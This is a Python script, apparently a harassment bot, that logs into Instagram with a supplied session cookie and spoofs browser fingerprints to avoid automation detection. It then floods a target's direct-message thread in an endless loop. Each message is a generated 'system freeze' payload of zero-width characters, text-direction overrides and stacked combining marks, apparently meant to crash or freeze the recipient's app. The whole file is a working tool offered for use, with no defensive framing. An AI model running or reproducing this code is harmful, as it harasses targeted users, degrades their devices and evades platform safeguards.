# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (SYNC-FIX)
# 📅 STATUS: SELECTOR-V6 | REDIRECT-DETECTION | 1-ID

import os, asyncio, random, sys
from playwright.async_api import async_playwright

def get_kernel_stop_payload(target_name):
    u_id = random.randint(100000, 999999)
    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d", "\u200e"], k=10))
    header = f"⚡ 【﻿ ＳＹＳＴＥＭ　ＦＲＥＥＺＥ 】 ⚡\n🆔 {u_id}{salt}\n"
    z_tower = "̸" * random.randint(50, 60) 
    width_bomb = "\u2800\u00A0" * 30
    lines = [header]
    for i in range(80): 
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        noise = "".join(random.choices("012345", k=3))
        lines.append(f"{width_bomb}{prefix}𝕻𝕬𝕻𝕬_{noise}{z_tower}")
    return "\n".join(lines)[:9900]

async def agent_blitz(machine_id, cookie_list, target_id, target_name):
    current_cookie = cookie_list[0].strip()

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--disable-blink-features=AutomationControlled"])
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        )
        page = await context.new_page()
        await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

        try:
            print(f"📡 [M{machine_id}] Establishing Connection...")
            await page.goto("https://www.instagram.com/robots.txt")
            await context.add_cookies([{"name": "sessionid", "value": current_cookie, "domain": ".instagram.com", "path": "/", "secure": True}])

            # Navigate and check for redirects
            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
            await asyncio.sleep(5)

            if "login" in page.url or "checkpoint" in page.url:
                print(f"❌ [M{machine_id}] LOGIN FAILED: Account redirected to {page.url.split('/')[-2]}. Cookie expired or Captcha triggered.")
                return

            # 🛠️ MULTI-SELECTOR SEARCH (Bypasses UI Updates)
            selectors = [
                "//div[@contenteditable='true']",
                "//div[@role='textbox']",
                "aria-label='Message...'",
                "aria-label='Write a message...'"
            ]
            
            box = None
            for sel in selectors:
                try:
                    box = await page.wait_for_selector(sel, timeout=10000)
                    if box: 
                        print(f"✅ [M{machine_id}] Selector Found: {sel}")
                        break
                except: continue

            if not box:
                raise Exception("No message box found. UI might have changed.")

            while True:
                payload = get_kernel_stop_payload(target_name)
                await box.click()
                await box.fill(payload)
                await asyncio.sleep(2)
                await page.keyboard.press("Enter")
                
                print(f"💀 [M{machine_id}] Pulse Delivered.")
                await asyncio.sleep(random.uniform(140, 180))

        except Exception as e:
            print(f"❌ [M{machine_id}] Fatal Error: {str(e)}")
            await browser.close()

if __name__ == "__main__":
    cookies = os.environ.get("SESSION_ID", "").split(",")
    t_id = os.environ.get("GROUP_URL", "").strip()
    t_name = os.environ.get("TARGET_NAME", "Target").strip()
    asyncio.run(agent_blitz(1, cookies, t_id, t_name))
